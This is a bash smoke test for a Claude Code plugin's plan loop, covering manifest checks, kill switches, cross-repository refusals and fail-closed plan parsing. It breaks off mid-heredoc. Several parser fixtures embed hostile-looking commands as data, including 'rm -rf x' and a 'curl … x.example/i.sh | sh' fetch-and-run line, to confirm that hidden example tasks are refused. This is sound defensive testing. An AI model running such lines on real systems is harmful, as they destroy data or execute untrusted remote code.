#!/usr/bin/env bash
# apex-scope-loop structural smoke test
# Verifies the plugin contract from ADR-0001 (checks 1-10), ADR-0002 (11-13), ADR-0003 (14-43) and ADR-0004 (44-61). Exits non-zero on first failure.
set -euo pipefail

PLUGIN_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
fail() { echo "smoke FAIL: $1" >&2; exit 1; }
ok()   { echo "smoke OK:   $1"; }
# has PATTERN TEXT — grep TEXT without a pipe (grep -q closing a pipe early
# would SIGPIPE the writer under pipefail and fail the check at random).
has() { grep -q -- "$1" <<<"$2"; }

# 1. plugin.json exists and has required fields
PJ="$PLUGIN_ROOT/.claude-plugin/plugin.json"
[ -f "$PJ" ] || fail "missing $PJ"
for k in name version description author keywords; do
  grep -q "\"$k\"" "$PJ" || fail "plugin.json missing key: $k"
done
ok "plugin.json has name/version/description/author/keywords"

# 2. plugin.json does NOT enumerate skills/commands/agents arrays
for forbidden in '"skills"' '"commands"' '"agents"'; do
  if grep -q "$forbidden[[:space:]]*:[[:space:]]*\[" "$PJ"; then
    fail "plugin.json enumerates $forbidden array (must be auto-discovered)"
  fi
done
ok "plugin.json does not enumerate skills/commands/agents"

# 3 & 4. Both SKILL.md files have valid kebab-case name
for skill in apex-plan apex-execute; do
  S="$PLUGIN_ROOT/skills/$skill/SKILL.md"
  [ -f "$S" ] || fail "missing skill: $S"
  # Extract name: line from frontmatter (must be unquoted kebab-case)
  name_line=$(awk '/^---$/{c++; next} c==1 && /^name:/{print; exit}' "$S")
  [ -n "$name_line" ] || fail "$skill SKILL.md missing name: frontmatter"
  [[ "$name_line" =~ ^name:[[:space:]]+$skill[[:space:]]*$ ]] \
    || fail "$skill SKILL.md name: must be kebab-case '$skill' (got: $name_line)"
  ok "$skill SKILL.md frontmatter is valid"
done

# 5. No wildcard tools in any SKILL.md
for s in "$PLUGIN_ROOT"/skills/*/SKILL.md; do
  if grep -qE "allowed-tools:.*(\\*|mcp__\\*)" "$s"; then
    fail "$s has wildcard in allowed-tools"
  fi
done
ok "no wildcard tools in skills"

# 6. Both commands present with valid frontmatter
for cmd in start iterate; do
  C="$PLUGIN_ROOT/commands/$cmd.md"
  [ -f "$C" ] || fail "missing command: $C"
  grep -qE "^name:[[:space:]]+$cmd[[:space:]]*$" "$C" \
    || fail "$cmd command frontmatter missing or invalid name:"
  grep -q "^description:" "$C" || fail "$cmd command missing description"
done
ok "commands start + iterate present with valid frontmatter"

# 7. plan-author agent present with model: sonnet
A="$PLUGIN_ROOT/agents/plan-author.md"
[ -f "$A" ] || fail "missing agent: $A"
grep -qE "^name:[[:space:]]+plan-author[[:space:]]*$" "$A" || fail "plan-author missing name"
grep -qE "^model:[[:space:]]+sonnet[[:space:]]*$" "$A" || fail "plan-author missing model: sonnet"
ok "plan-author agent present with model: sonnet"

# 8. README has required sections
R="$PLUGIN_ROOT/README.md"
[ -f "$R" ] || fail "missing README.md"
for section in "Compatibility" "Namespace coordination" "Verification" "Architecture Decisions"; do
  grep -q "## $section" "$R" || fail "README missing section: $section"
done
ok "README has Compatibility/Namespace/Verification/ADR sections"

# 9. ADR-0001 exists with Status: Proposed
ADR="$PLUGIN_ROOT/docs/adrs/0001-apex-scope-loop-contract.md"
[ -f "$ADR" ] || fail "missing ADR-0001"
grep -qE "^- \*\*Status:\*\* Proposed" "$ADR" || fail "ADR-0001 not in Proposed status"
ok "ADR-0001 exists with Status: Proposed"

# 10. All .sh scripts in skills/ and scripts/ are executable
non_exec=$(find "$PLUGIN_ROOT/skills" "$PLUGIN_ROOT/scripts" -name "*.sh" \! -perm -u+x 2>/dev/null || true)
if [ -n "$non_exec" ]; then
  fail "non-executable .sh files found: $non_exec"
fi
ok "all .sh scripts are executable"

# 11. gibson-reviewer agent (ADR-0002) present, with a model and a VERDICT contract
GR="$PLUGIN_ROOT/agents/gibson-reviewer.md"
[ -f "$GR" ] || fail "missing agent: $GR"
grep -qE "^name:[[:space:]]+gibson-reviewer[[:space:]]*$" "$GR" || fail "gibson-reviewer missing name"
grep -qE "^model:[[:space:]]+[a-z]+" "$GR" || fail "gibson-reviewer missing model:"
grep -q "VERDICT: APPROVE" "$GR" || fail "gibson-reviewer does not define the VERDICT contract"
ok "gibson-reviewer agent present with model + VERDICT contract"

# 12. Harness scripts present and The Gibson credited
for s in green-gate risk-tier lessons backlog findings snapshot; do
  [ -f "$PLUGIN_ROOT/skills/apex-execute/scripts/$s.sh" ] || fail "missing harness script: $s.sh"
done
grep -q "The Gibson" "$PLUGIN_ROOT/NOTICE" 2>/dev/null || fail "NOTICE missing or does not credit The Gibson"
ok "harness scripts present; NOTICE credits The Gibson"

# 13. ADR-0002 exists with Status: Proposed
ADR2="$PLUGIN_ROOT/docs/adrs/0002-gibson-harness.md"
[ -f "$ADR2" ] || fail "missing ADR-0002"
grep -qE "^- \*\*Status:\*\* Proposed" "$ADR2" || fail "ADR-0002 not in Proposed status"
ok "ADR-0002 exists with Status: Proposed"

# 14. Portability (ADR-0003): no repo-local .claude/skills paths in commands, skills or agents
hits=$(grep -rnE '\.claude/skills/apex-(execute|plan)/' "$PLUGIN_ROOT/commands" "$PLUGIN_ROOT/skills" "$PLUGIN_ROOT/agents" 2>/dev/null || true)
[ -z "$hits" ] || fail "repo-local .claude/skills path (breaks marketplace installs): $hits"
[ ! -e "$PLUGIN_ROOT/skills/apex-execute/resources/templates/hooks-snippet.json" ] || fail "hooks-snippet.json must stay deleted (it pointed at a non-existent guardrail)"
ok "no .claude/skills paths; hooks-snippet.json removed"

# 15-16. Functional: a plan promoted in a scratch repo, then resolved from the
# base checkout and from inside the plan worktree, lands on ONE state dir.
# The functional checks must not inherit the caller's loop configuration.
for v in $(compgen -e | grep '^APEX_' || true); do unset "$v"; done
# The sibling apex-dispatch (shipped in this marketplace) routes every iterate
# and writes <state>/dispatch/, which puts checkpoint.sh into provenance mode.
# The scope-loop checks run with routing off (the 0.2.0 brief); checks 26 and
# 29 turn it back on to cover the integration, and 33 builds dispatch state itself.
export APEX_DISPATCH_MODE=off
SMOKE_TMP="$(mktemp -d "${TMPDIR:-/tmp}/apex-scope-loop-smoke.XXXXXX")"
trap 'git -C "$SMOKE_TMP/repo" worktree prune >/dev/null 2>&1 || true; rm -rf "$SMOKE_TMP"' EXIT
[ -n "${SMOKE_KEEP:-}" ] && trap - EXIT
export GIT_AUTHOR_NAME=smoke GIT_AUTHOR_EMAIL=smoke@example.invalid GIT_COMMITTER_NAME=smoke GIT_COMMITTER_EMAIL=smoke@example.invalid
R="$SMOKE_TMP/repo"; mkdir -p "$R/.claude/tasks" "$R/.claude/plans"
git -C "$R" init -q -b main
cat >"$R/.claude/tasks/demo-adr.md" <<'ADR'
# ADR: demo
**Status**: Accepted
ADR
cp "$PLUGIN_ROOT/skills/apex-execute/resources/examples/sample-plan.md" "$R/.claude/plans/demo-plan.md"
git -C "$R" add -A && git -C "$R" commit -qm init
EX="$PLUGIN_ROOT/skills/apex-execute/scripts"
( cd "$R" && APEX_GIBSON=0 APEX_MEMORY_CMD= "$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh" demo >"$SMOKE_TMP/promote.log" 2>&1 ) \
  || fail "promote-to-loop.sh failed in a repo with no .claude/skills copy: $(tail -3 "$SMOKE_TMP/promote.log")"
ok "promote-to-loop resolves init.sh plugin-relatively (no .claude/skills copy)"

# brief DIR PLAN — iterate.sh's full brief, captured before any grep (grep -q
# closing the pipe early would SIGPIPE iterate.sh under pipefail).
# The exit code is kept as a final "__RC__: n" line so crashes are visible.
brief() { local o rc=0; o="$( (cd "$1" && "$EX/iterate.sh" "$2") 2>&1)" || rc=$?; printf '%s\n__RC__: %s\n' "$o" "$rc"; }

st() { # st DIR PLAN — the STATE line iterate.sh reports for PLAN when run from DIR
  ( cd "$1" && "$EX/iterate.sh" "$2" 2>&1 | sed -n 's/^STATE: //p' | head -1 ) || true
}
S_BASE="$(st "$R" .claude/plans/demo-plan.md)"
WTP="$( (cd "$R" && "$EX/iterate.sh" .claude/plans/demo-plan.md 2>&1 | sed -n 's/^WORKTREE: //p') || true)"
[ -n "$WTP" ] && [ -d "$WTP" ] || fail "iterate.sh did not report a plan worktree"
S_WT_PLAN="$(st "$WTP" "$WTP/.claude/plans/demo-plan.md")"
S_WT_CWD="$(st "$WTP" "$R/.claude/plans/demo-plan.md")"
ln -s "$R" "$SMOKE_TMP/link"
S_LINK="$(st "$SMOKE_TMP/link" .claude/plans/demo-plan.md)"
[ -n "$S_BASE" ] && [ "$S_BASE" = "$S_WT_PLAN" ] && [ "$S_BASE" = "$S_WT_CWD" ] && [ "$S_BASE" = "$S_LINK" ] \
  || fail "state dir differs: base=$S_BASE worktree-plan=$S_WT_PLAN worktree-cwd=$S_WT_CWD symlink=$S_LINK"
ok "one state dir from the base checkout, the plan worktree and a symlinked path"

# 17. Kill switches: a HALT in the checkout you run from, and a shared HALT, both stop the loop.
LW="$SMOKE_TMP/linked"; git -C "$R" worktree add -q -b linked "$LW" main
mkdir -p "$LW/gibson" && touch "$LW/gibson/HALT"
has '^STATUS: HALTED' "$(brief "$LW" "$R/.claude/plans/demo-plan.md")" \
  || fail "gibson/HALT in the linked worktree being run from was ignored"
rm -f "$LW/gibson/HALT"; touch "$R/.dev-plan-state/HALT"
has '^STATUS: HALTED' "$(brief "$LW" "$R/.claude/plans/demo-plan.md")" \
  || fail "shared .dev-plan-state/HALT was ignored from a linked worktree"
rm -f "$R/.dev-plan-state/HALT"
ok "checkout-local and shared kill switches both halt"

# 18. Outside git (APEX_NO_WORKTREE=1): init and iterate agree; same-named plans stay separate.
NG="$SMOKE_TMP/nogit"; mkdir -p "$NG/a" "$NG/b"
cp "$R/.claude/plans/demo-plan.md" "$NG/a/plan.md"; cp "$R/.claude/plans/demo-plan.md" "$NG/b/plan.md"
( cd "$NG" && APEX_NO_WORKTREE=1 APEX_GIBSON=0 "$EX/init.sh" a/plan.md >/dev/null && APEX_NO_WORKTREE=1 APEX_GIBSON=0 "$EX/init.sh" b/plan.md >/dev/null ) \
  || fail "init.sh failed outside git with APEX_NO_WORKTREE=1"
has '^STATUS: READY' "$(brief "$NG" a/plan.md)" || fail "iterate.sh outside git does not find the state init.sh wrote"
[ "$(st "$NG" a/plan.md)" != "$(st "$NG" b/plan.md)" ] || fail "two plans named plan.md share one state dir outside git"
ok "non-git mode: init/iterate agree and same-named plans do not collide"

# indir DIR CMD... — run CMD in DIR (portable stand-in for GNU `env -C`).
indir() { local d="$1"; shift; ( cd "$d" && env "$@" ); }
# expect_refusal LABEL PATTERN CMD... — CMD must fail and say PATTERN.
expect_refusal() {
  local label="$1" pat="$2" out; shift 2
  if out="$("$@" 2>&1)"; then fail "$label: expected a refusal, got success"; fi
  has "$pat" "$out" || fail "$label: refused for the wrong reason: $(printf '%s' "$out" | tail -2)"
}

# 19. A run is never silently taken over: re-init from another checkout with a
#     different base refuses; same base keeps the run's history.
expect_refusal "retarget to another base" "Refusing to retarget" \
  indir "$LW" APEX_BASE_BRANCH=linked "$EX/init.sh" "$R/.claude/plans/demo-plan.md"
python3 - "$S_BASE/checkpoint.json" <<'PY'
import json, sys
p = sys.argv[1]; s = json.load(open(p)); s.setdefault("reviews", {})["99"] = {"sha": "x", "verdict": "APPROVE"}; json.dump(s, open(p, "w"))
PY
( cd "$R" && APEX_GIBSON=0 "$EX/init.sh" .claude/plans/demo-plan.md >/dev/null 2>&1 ) || fail "same-base re-init failed"
python3 -c 'import json,sys; sys.exit(0 if "99" in json.load(open(sys.argv[1])).get("reviews",{}) else 1)' "$S_BASE/checkpoint.json" \
  || fail "same-base re-init discarded the run's reviews"
ok "init refuses takeover; re-init keeps run history"

# 20. APEX_STATE_ROOT moves state only, is made absolute, and is keyed per repository.
cp "$R/.claude/plans/demo-plan.md" "$R/.claude/plans/rel-plan.md"
( cd "$R" && APEX_STATE_ROOT=rel-root APEX_GIBSON=0 "$EX/init.sh" .claude/plans/rel-plan.md >/dev/null 2>&1 ) || fail "init.sh with a relative APEX_STATE_ROOT failed"
A1="$(APEX_STATE_ROOT=rel-root st "$R" .claude/plans/rel-plan.md)"
A2="$(APEX_STATE_ROOT="$R/rel-root" st "$R/.claude" plans/rel-plan.md)"
case "$A1" in /*) ;; *) fail "APEX_STATE_ROOT state dir is not absolute: '$A1'" ;; esac
[ "$A1" = "$A2" ] || fail "relative APEX_STATE_ROOT split state: $A1 vs $A2"
ok "APEX_STATE_ROOT is absolute and stable across working directories"

# 21. One repository, proven: every acting script refuses another repo's plan,
#     even when the caller's repo runs a same-path plan; reporting scripts warn.
O="$SMOKE_TMP/other"; git init -q -b main "$O"; mkdir -p "$O/.claude/plans"
cp "$R/.claude/plans/demo-plan.md" "$O/.claude/plans/demo-plan.md"
git -C "$O" add -A && git -C "$O" commit -qm o
( cd "$O" && APEX_GIBSON=0 "$EX/init.sh" .claude/plans/demo-plan.md >/dev/null 2>&1 ) || fail "init in the second repo failed"
O_HEAD="$(git -C "$O" rev-parse main)"
RP="$R/.claude/plans/demo-plan.md"
expect_refusal "init.sh cross-repo"       "repository mismatch.*refusing to act" indir "$O" "$EX/init.sh" "$RP"
expect_refusal "land.sh cross-repo"       "repository mismatch.*refusing to act" indir "$O" "$EX/land.sh" "$RP" --force
expect_refusal "checkpoint.sh cross-repo" "repository mismatch.*refusing to act" indir "$O" "$EX/checkpoint.sh" "$RP" halt x
expect_refusal "green-gate.sh cross-repo" "repository mismatch.*refusing to act" indir "$O" "$EX/green-gate.sh" "$RP" check
expect_refusal "risk-tier.sh cross-repo"  "repository mismatch.*refusing to act" indir "$O" "$EX/risk-tier.sh" "$RP" 1
IT_OUT="$( (cd "$O" && "$EX/iterate.sh" "$RP" 2>/dev/null) || true)"
has '^STATUS: ERROR repository mismatch' "$IT_OUT" || fail "iterate.sh cross-repo did not report STATUS: ERROR repository mismatch"
[ "$(git -C "$O" rev-parse main)" = "$O_HEAD" ] || fail "a cross-repo call moved the other repo's main"
ST_OUT="$( (cd "$O" && "$EX/status.sh" "$RP" 2>&1) || true)"
has 'WARNING: repository mismatch' "$ST_OUT" || fail "status.sh did not warn on a cross-repo plan"
ok "acting scripts refuse another repository's plan; status warns"

# 22. Branches are per plan; a foreign same-name branch is never adopted; a
#     deleted worktree is recreated by init.
B1="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_branch"])' "$S_BASE/checkpoint.json")"
mkdir -p "$R/other"; cp "$RP" "$R/other/demo-plan.md"
( cd "$R" && APEX_GIBSON=0 "$EX/init.sh" other/demo-plan.md >/dev/null 2>&1 ) || fail "init of a same-slug plan failed"
B2="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_branch"])' "$(st "$R" other/demo-plan.md)/checkpoint.json")"
[ "$B1" != "$B2" ] || fail "two same-slug plans share branch $B1"
cp "$RP" "$R/.claude/plans/fresh-plan.md"
FRESH_STATE="$(cd "$R" && source "$EX/_lib.sh" && apex_resolve .claude/plans/fresh-plan.md && echo "$STATE_DIR")"
git -C "$R" branch "apex-scope-loop/fresh-$(basename "$FRESH_STATE")" main
expect_refusal "adopt foreign branch" "refusing to adopt" indir "$R" APEX_GIBSON=0 "$EX/init.sh" .claude/plans/fresh-plan.md
WT2="$(st "$R" other/demo-plan.md)/worktree"
rm -rf "$WT2"
( cd "$R" && APEX_GIBSON=0 "$EX/init.sh" other/demo-plan.md >/dev/null 2>&1 ) || fail "re-init after deleting the worktree failed"
[ -d "$WT2" ] && [ "$(git -C "$WT2" symbolic-ref -q HEAD)" = "refs/heads/$B2" ] || fail "deleted worktree was not recreated on its branch"
ok "per-plan branches; foreign branch refused; deleted worktree recreated"

# 23. land.sh: refuses from the wrong checkout and with unrelated base changes,
#     without modifying anything; lands the exact worktree head otherwise.
L="$SMOKE_TMP/landrepo"; mkdir -p "$L/plans"; git init -q -b main "$L"
printf -- '- [x] **Phase 1.1** [docs] done\n  - Acceptance: true\n' >"$L/plans/l-plan.md"; echo base >"$L/tracked.txt"
git -C "$L" add -A && git -C "$L" commit -qm base
( cd "$L" && APEX_GIBSON=0 "$EX/init.sh" plans/l-plan.md >/dev/null 2>&1 ) || fail "init for the land test failed"
LWT="$(cd "$L" && "$EX/iterate.sh" plans/l-plan.md | sed -n 's/^WORKTREE: //p')"
[ -n "$LWT" ] || LWT="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_path"])' "$(st "$L" plans/l-plan.md)/checkpoint.json")"
echo feature >"$LWT/feature.txt"; git -C "$LWT" add -A; git -C "$LWT" commit -qm feature
LH="$(git -C "$LWT" rev-parse HEAD)"; MAIN0="$(git -C "$L" rev-parse main)"
expect_refusal "land from inside the plan worktree" "run land.sh from there" indir "$LWT" APEX_GIBSON=0 "$EX/land.sh" "$L/plans/l-plan.md"
echo dirty >>"$L/tracked.txt"
expect_refusal "land with unrelated base changes" "unrelated to this plan" indir "$L" APEX_GIBSON=0 "$EX/land.sh" plans/l-plan.md
[ "$(git -C "$L" rev-parse main)" = "$MAIN0" ] && [ "$(git -C "$LWT" rev-parse HEAD)" = "$LH" ] || fail "a refused land modified a branch"
git -C "$L" checkout -q -- tracked.txt
( cd "$L" && APEX_GIBSON=0 "$EX/land.sh" plans/l-plan.md >/dev/null 2>&1 ) || fail "land.sh failed on a ready plan"
git -C "$L" merge-base --is-ancestor "$LH" main || fail "land.sh did not merge the worktree head"
ok "land.sh refuses safely and merges the exact worktree head"

# 24. Every script that sources _lib.sh resolves (and so guards) before reading state.
for f in "$EX"/*.sh "$PLUGIN_ROOT"/skills/apex-plan/scripts/*.sh; do
  grep -q '_lib.sh"' "$f" || continue
  awk '/apex_resolve "\$PLAN"/{r=1} /read_field |\$CHECKPOINT/{ if(!r){bad=1; exit} } END{exit bad}' "$f" \
    || fail "$(basename "$f") reads state before apex_resolve"
done
ok "every _lib.sh user resolves before reading state"

# 25. Plan parsing (planlib.py, the one parser): widened tags, 8-line look-ahead
#     with six directives, Blocked-by forms, next-unblocked selection, fail-closed
#     unknown references, validation (Route/Budget values, lanes need Paths, cycles).
PL="$EX/planlib.py"; P25="$SMOKE_TMP/p25.md"
cat >"$P25" <<'PLAN'
- [x] **Phase 1.1** [docs] done
  - Acceptance: true
- [ ] **Phase 1.2** [backend][gate:partner:x@y.com] waits on 1.3
  - Acceptance: true
  - Blocked-by: **Phase 1.3**
- [ ] **Phase 1.3 — six directives** [tests] all six directives, see [docs](x.md)
  - Acceptance: `pytest -q`
  - Notes: directives may sit anywhere in the first eight lines
  - Blocked-by: phase-1.1
  - Swarm: single [coder]
  - Route: class=tests provider=auto fanout=lanes review=solo
  - Paths: tests/a/**
  - Budget: usd=2 spawns=3 minutes=20
- [ ] **Phase 1.4** [tests] lane two
  - Acceptance: true
  - Route: fanout=lanes
  - Paths: src/b/**
- [ ] **Phase 1.5** [docs] waits on a gate that does not exist
  - Acceptance: true
  - Blocked-by: Gate 9→10
PLAN
python3 - "$PL" "$P25" <<'PY' || fail "planlib next: wrong selection or parsing"
import json, subprocess, sys
d = json.loads(subprocess.check_output([sys.executable, sys.argv[1], "next", sys.argv[2]]))
t = d["task"]
assert d["status"] == "READY" and t["id"] == "Phase 1.3", d
assert t["acceptance"] == "pytest -q" and t["swarm"] == "single [coder]", t
assert t["route"] == {"class": "tests", "provider": "auto", "fanout": "lanes", "review": "solo"}, t["route"]
assert t["paths"] == ["tests/a/**"] and t["budget"] == {"usd": "2", "spawns": "3", "minutes": "20"}, t
assert d["lanes"] == [t["line_no"], t["line_no"] + 8], d["lanes"]
blocked = {b["id"]: b for b in d["blocked"]}
assert blocked["Phase 1.2"]["open"] == ["Phase 1.3"], blocked
assert blocked["Phase 1.5"]["unknown"] == ["Gate 9→10"], blocked
tags = json.loads(subprocess.check_output([sys.executable, sys.argv[1], "task", sys.argv[2], "3"]))["tags"]
assert tags == ["backend", "gate:partner:x@y.com"], tags
assert "docs" not in t["tags"] and t["tags"] == ["tests"], t["tags"]   # [docs](x.md) is link text
PY
python3 "$PL" next "$EX/../resources/examples/sample-plan.md" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert d["task"]["id"]=="Phase 1.1" and any(b["id"]=="Phase 1.2" and b["open"]==["Phase 1.1"] for b in d["blocked"]), d' \
  || fail "sample-plan: **Phase 1.2** Blocked-by phase-1.1 is not resolved"
V="$(python3 "$PL" validate "$P25" || true)"
has "Blocked-by 'Gate 9→10' does not name a task" "$V" || fail "validate missed an unknown Blocked-by"
printf -- '- [ ] **Phase 1.1** [x] a\n  - Acceptance: true\n  - Blocked-by: phase-1.2\n  - Route: class=nope fanout=lanes\n  - Budget: usd=-1\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n  - Blocked-by: phase-1.1\n' >"$SMOKE_TMP/bad.md"
V="$(python3 "$PL" validate "$SMOKE_TMP/bad.md" || true)"
for want in "Route class=nope" "fanout=lanes requires a Paths" "Budget usd=-1" "Blocked-by cycle"; do
  has "$want" "$V" || fail "validate missed: $want"
done
# Fail-closed parsing: fenced examples are not tasks; repeated Blocked-by
# lines merge; a duplicated id blocks until every copy is checked; '..' and
# absolute Paths never count as disjoint; line numbers match sed's.
cat >"$SMOKE_TMP/fc.md" <<'PLAN'
- [ ] **Phase 1.1** [docs] real
  - Acceptance: true
- [x] **Phase 1.2** [docs] done
  - Acceptance: true
- [ ] **Phase 2.1** [docs] two Blocked-by lines
  - Acceptance: true
  - Blocked-by: Phase 1.1
  - Blocked-by: Phase 1.2
- [x] **Phase 3.1** dup done
  - Acceptance: true
- [ ] **Phase 3.1** dup open
  - Acceptance: true
- [ ] **Phase 3.2** waits on a duplicated id
  - Acceptance: true
  - Blocked-by: Phase 3.1
PLAN
python3 - "$PL" "$SMOKE_TMP/fc.md" <<'PY' || fail "planlib fail-closed parsing"
import json, subprocess, sys
pl, p = sys.argv[1:]
d = json.loads(subprocess.check_output([sys.executable, pl, "next", p]))
assert d["task"]["id"] == "Phase 1.1" and d["task"]["line_no"] == 1, d["task"]
b = {x["id"]: x for x in d["blocked"]}
assert b["Phase 2.1"]["open"] == ["Phase 1.1"], b
assert b["Phase 3.2"]["open"] == ["Phase 3.1"], b
sys.dont_write_bytecode = True
sys.path.insert(0, pl.rsplit("/", 1)[0]); import planlib
assert not planlib.disjoint(["src/a/../shared/*.py"], ["src/shared/util.py"])
assert not planlib.disjoint(["/repo/src/**"], ["src/**"]) and not planlib.disjoint(["../x/**"], ["y/**"])
assert not planlib.disjoint(["src/a/**/../../b/x.py"], ["b/x.py"]) and not planlib.disjoint(["src/a/[.][.]/../b/x.py"], ["b/x.py"])
assert not planlib.disjoint(["Src/A/**"], ["src/a/x.py"])
assert planlib.disjoint(["src/a/**"], ["src/b/**"])
PY
printf 'line one \342\200\250 has U+2028\n- [ ] **Phase 1.1** A\n  - Acceptance: true\n- [ ] **Phase 1.2** B\n  - Acceptance: true\n' >"$SMOKE_TMP/ls.md"
# Every character str.splitlines would break on (U+2028, \v, \f, \x1c-\x1e,
# U+0085) is whitespace, so it is refused: line numbers cannot drift from sed's.
has "U+2028" "$(python3 "$PL" validate "$SMOKE_TMP/ls.md" 2>&1 || true)" || fail "a U+2028 line separator was not refused"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Acceptance: false\n  - N1: x\n  - N2: x\n  - N3: x\n  - N4: x\n  - N5: x\n  - N6: x\n  - Blocked-by: Phase 1.1\n\n  - Swarm: single\n' >"$SMOKE_TMP/late.md"
V="$(python3 "$PL" validate "$SMOKE_TMP/late.md" || true)"
for want in "Acceptance: given more than once" "beyond the 8-line look-ahead" "directive outside any task block"; do
  has "$want" "$V" || fail "validate missed: $want"
done
# Nothing is ever hidden: every column-0 "- [ ]" line is a task, and markdown
# structure can only make a plan invalid (fail closed), never drop a task or
# let example text supply a command.
fx() { printf '%b' "$2" >"$SMOKE_TMP/$1.md"; python3 "$PL" next "$SMOKE_TMP/$1.md" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["status"], (d.get("task") or {}).get("id"))'; }
vx() { python3 "$PL" validate "$SMOKE_TMP/$1.md" 2>&1 || true; }
[ "$(fx f1 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n```x``` marks inline code\n\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "READY Phase 1.2" ] || fail "inline code at line start opened a fence"
[ "$(fx f2 '- [x] **Phase 1.1** a\n  - Acceptance: true\n```\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "ERROR None" ] || fail "an unclosed fence did not make the plan an error"
[ "$(fx f3 '~~~\n```\n- [ ] **Phase 9** x\n  - Acceptance: rm -rf x\n~~~\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task line inside a fence was not refused"
[ "$(fx f4 '````\n```\n- [ ] **Phase 9** x\n  - Acceptance: rm -rf x\n````\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task line inside a four-backtick fence was not refused"
[ "$(fx f6 '<!--\n- [ ] **Phase 9.1** commented out\n  - Acceptance: rm -rf x\n-->\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task line inside an HTML comment was not refused"
[ "$(fx f7 '<!-- never closed\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "an unclosed HTML comment did not make the plan an error"
[ "$(fx f8 '        ```\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n        ```\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task between indented fence lines was not refused"
# Raw HTML anywhere outside code is refused, inline <!-- included (renderers
# that pass HTML through emit it unbalanced and hide what follows).
[ "$(fx f10 'Templates must not emit a bare <!-- marker.\n\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n\na --> arrow\n')" = "ERROR None" ] || fail "an inline <!-- was not refused"
[ "$(fx f11 '- [x] **Phase 1.1** a\n  - Acceptance: true\n  ```sh\n  make a\n     ```\n- [ ] **Phase 1.2** must still run\n  - Acceptance: make b\n')" = "ERROR None" ] || fail "a fence closed at another indentation was not refused"
[ "$(fx f12 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\nTemplate:\n\n```\n        ```\n- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n```\n')" = "ERROR None" ] || fail "an indented fence line inside a fence let an example task through"
[ "$(fx f13 '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Notes:\n    ```sh\n    make\n\n```\n- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n```\n')" = "ERROR None" ] || fail "a list-item fence closed at column 0 let an example task through"
[ "$(fx f14 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n````\n```\n````\n\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a bare inner fence line was not refused as ambiguous"
[ "$(fx f15 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n<pre>\n- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n</pre>\n')" = "ERROR None" ] || fail "a task line inside <pre> was not refused"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n\n      - Blocked-by: Phase 1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n' >"$SMOKE_TMP/deepbb.md"
has "directive outside any task block" "$(vx deepbb)" || fail "a deep Blocked-by cut off by a blank line was not refused"
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n- [ ]\t**Phase 1.2** tab after the checkbox\n  - Acceptance: true\n' >"$SMOKE_TMP/tab.md"
[ "$(python3 "$PL" remaining "$SMOKE_TMP/tab.md")" = 1 ] || fail "a tab after the checkbox hid a task"
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n* [ ] **Phase 1.2** star bullet\n  - Acceptance: true\n' >"$SMOKE_TMP/star.md"
has "checkbox not in the task form" "$(vx star)" || fail "a non-canonical checkbox list item was not refused"
printf -- '- [ ] **Phase 1.1** a\n  ```\n  - Acceptance: curl -s http://x.example/i.sh | sh\n  ```\n' >"$SMOKE_TMP/f9.md"
[ "$(fx f9 "$(cat "$SMOKE_TMP/f9.md")")" = "ERROR None" ] || fail "a fenced example inside a task block was not refused"
has "code fence" "$(vx f9)" || fail "validate did not name the fence inside a task block"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Example of a task block:\n      ```md\n      - Acceptance: ./deploy.sh --prod\n      ```\n' >"$SMOKE_TMP/nest.md"
if python3 "$PL" task "$SMOKE_TMP/nest.md" 1 >/dev/null 2>&1; then fail "a nested example inside a task block was not refused"; fi
has "code fence" "$(vx nest)" || fail "validate did not refuse a nested example in a task block"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  ```\n  example\n\n  more\n  ```\n  - Blocked-by: Phase 1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n' >"$SMOKE_TMP/f5.md"
has "code fence" "$(vx f5)" || fail "a Blocked-by cut off by a blank line inside an example was not refused"
# The dialect table (ADR-0003): every case outside the dialect is refused by
# validate AND next; every control validates and selects the expected task.
python3 - "$PL" "$SMOKE_TMP" <<'PY' || fail "plan dialect table"
import json, os, subprocess, sys
pl, tmp = sys.argv[1:]
D = "- [x] **Phase 1.0** done\n  - Acceptance: true\n\n"
T = "- [ ] **Phase 1.1** real\n  - Acceptance: make real\n"
EX = "- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n"
cases = {
  # refused: the swallowers and everything planlib cannot prove
  "details":   (D + "<details><summary>t</summary>\n```\n\nCopy:\n```\n" + EX + "```\n</details>\n```\n```\n", None),
